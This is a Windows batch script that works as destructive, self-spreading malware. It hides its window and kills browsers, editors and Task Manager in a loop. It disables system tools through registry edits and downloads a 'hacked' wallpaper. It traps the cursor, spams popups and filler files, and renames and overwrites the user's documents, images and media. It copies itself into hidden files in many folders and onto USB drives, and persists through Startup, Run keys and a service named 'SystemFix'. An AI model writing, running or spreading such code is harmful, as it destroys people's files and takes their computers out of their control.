@echo off
if "%~1"=="hide" goto main
powershell -windowstyle hidden -command "Start-Process cmd -ArgumentList '/c %~nx0 hide' -WindowStyle Hidden"
exit /b

:main
setlocal enabledelayedexpansion

:killloop
taskkill /f /im notepad.exe >nul 2>&1
taskkill /f /im calc.exe >nul 2>&1
taskkill /f /im mspaint.exe >nul 2>&1
taskkill /f /im taskmgr.exe >nul 2>&1
taskkill /f /im write.exe >nul 2>&1
taskkill /f /im winword.exe >nul 2>&1
taskkill /f /im excel.exe >nul 2>&1
taskkill /f /im powerpnt.exe >nul 2>&1
taskkill /f /im outlook.exe >nul 2>&1
taskkill /f /im msedge.exe >nul 2>&1
taskkill /f /im chrome.exe >nul 2>&1
taskkill /f /im firefox.exe >nul 2>&1
taskkill /f /im brave.exe >nul 2>&1
taskkill /f /im discord.exe >nul 2>&1
taskkill /f /im steam.exe >nul 2>&1
taskkill /f /im steamwebhelper.exe >nul 2>&1
taskkill /f /im Spotify.exe >nul 2>&1
taskkill /f /im Code.exe >nul 2>&1
taskkill /f /im devenv.exe >nul 2>&1
taskkill /f /im git-bash.exe >nul 2>&1
taskkill /f /im VBoxSVC.exe >nul 2>&1
taskkill /f /im VirtualBox.exe >nul 2>&1

:disables
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFolderOptions /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%temp%\hack.jpg" /f >nul 2>&1
reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 2 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideFileExt /t REG_DWORD /d 1 /f >nul 2>&1

:wallpaper
powershell -command "Invoke-WebRequest -Uri 'https://i.imgur.com/BjDp9XH.jpg' -OutFile '%temp%\hack.jpg'" >nul 2>&1
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters >nul 2>&1

:mousetrap
start /b powershell -command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Hide(); while($true){[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(0,0); Start-Sleep -Milliseconds 10}" >nul 2>&1

:popup
start /b powershell -command "Add-Type -AssemblyName System.Windows.Forms; while($true){[System.Windows.Forms.MessageBox]::Show('YOUR SYSTEM IS DESTROYED','HACKED'); Start-Sleep -Milliseconds 500}" >nul 2>&1

:beep
start /b powershell -command "while($true){[System.Console]::Beep(1000,300); [System.Console]::Beep(800,300); Start-Sleep -Milliseconds 100}" >nul 2>&1

:screenflicker
start /b powershell -command "Add-Type -AssemblyName System.Windows.Forms; while($true){[System.Windows.Forms.Screen]::AllScreens[0].Bounds; $width=800; $height=600; Start-Sleep -Milliseconds 200; $width=1920; $height=1080; Start-Sleep -Milliseconds 200}" >nul 2>&1

:openapps
start /b powershell -command "while($true){Start-Process 'mspaint'; Start-Process 'calc'; Start-Process 'notepad'; Start-Sleep -Seconds 2}" >nul 2>&1

:createloop
start /b powershell -command "while($true){$folder = [System.IO.Path]::Combine($env:USERPROFILE,'Desktop',[System.String]::Join('', (1..8 | % { (65..90 + 97..122 | Get-Random) | % {[char]$_} }))); New-Item -Path $folder -ItemType Directory -Force | Out-Null; for($i=0; $i -lt 100; $i++){New-Item -Path (Join-Path $folder "$i.txt") -ItemType File -Value (Get-Random) -Force | Out-Null}}" >nul 2>&1

:renameall
for /r "%userprofile%\desktop" %%f in (*.*) do (ren "%%f" "%random%%random%%random%" 2>nul)
for /r "%userprofile%\documents" %%f in (*.*) do (ren "%%f" "%random%%random%%random%" 2>nul)
for /r "%userprofile%\downloads" %%f in (*.*) do (ren "%%f" "%random%%random%%random%" 2>nul)
for /r "%userprofile%\videos" %%f in (*.*) do (ren "%%f" "%random%%random%%random%" 2>nul)
for /r "%userprofile%\music" %%f in (*.*) do (ren "%%f" "%random%%random%%random%" 2>nul)
for /r "%userprofile%\pictures" %%f in (*.*) do (ren "%%f" "%random%%random%%random%" 2>nul)

:corruptfiles
for /r "%userprofile%\desktop" %%f in (*.txt *.docx *.xlsx *.pptx *.pdf *.jpg *.png *.mp3 *.mp4) do (echo %random% > "%%f" 2>nul)
for /r "%userprofile%\documents" %%f in (*.txt *.docx *.xlsx *.pptx *.pdf *.jpg *.png *.mp3 *.mp4) do (echo %random% > "%%f" 2>nul)
for /r "%userprofile%\downloads" %%f in (*.txt *.docx *.xlsx *.pptx *.pdf *.jpg *.png *.mp3 *.mp4) do (echo %random% > "%%f" 2>nul)

:diskfill
start /b powershell -command "while($true){$file=[System.IO.Path]::Combine($env:TEMP, (Get-Random -Max 999999).ToString()+'.tmp'); fsutil file createnew $file 1048576 | Out-Null}" >nul 2>&1

:replicate
set "targets=%APPDATA% %TEMP% %USERPROFILE%\Desktop %USERPROFILE%\Documents %USERPROFILE%\Downloads %USERPROFILE%\Videos %USERPROFILE%\Music %USERPROFILE%\Pictures %WINDIR%\Temp C:\ProgramData"
for %%d in (%targets%) do (
  if exist "%%d" (
    set "rname="
    for /l %%i in (1,1,8) do set "rname=!rname!!random:~-1!"
    copy "%~f0" "%%d\!rname!.bat" >nul 2>&1
    attrib +h +s "%%d\!rname!.bat" >nul 2>&1
    start /b "" "%%d\!rname!.bat" >nul 2>&1
  )
)

:usb
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
  if exist "%%d:\" (
    copy "%~f0" "%%d:\%random%%random%.bat" >nul 2>&1
    attrib +h +s "%%d:\%random%%random%.bat" >nul 2>&1
  )
)

:startup
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%random%.bat" >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemFix" /t REG_SZ /d "%~f0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SystemFix" /t REG_SZ /d "%~f0" /f >nul 2>&1
sc create "SystemFix" binPath= "cmd /c %~f0" start= auto >nul 2>&1

:final
timeout /t 2 /nobreak >nul
goto killloop
